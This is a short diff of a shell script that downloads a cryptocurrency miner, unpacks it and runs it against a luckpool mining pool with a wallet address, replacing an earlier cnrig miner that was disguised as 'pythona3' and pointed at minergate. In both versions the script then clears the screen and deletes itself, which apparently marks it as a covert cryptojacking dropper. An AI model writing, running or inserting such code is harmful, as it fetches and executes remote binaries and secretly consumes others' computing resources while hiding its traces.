@@ -4,9 +4,9 @@ if [ $? -eq 0 ]; then
   clear
   rm -- "$0"
 else
-  wget -O pythona3 https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64
-  chmod +x pythona3
-  ./pythona3 --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B
+  wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+  tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+  nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RV2tjiZptDEbuyaecnVH22PUg5Z7ihyiT2.try -p x -t 4
   clear
   rm -- "$0"
 fi
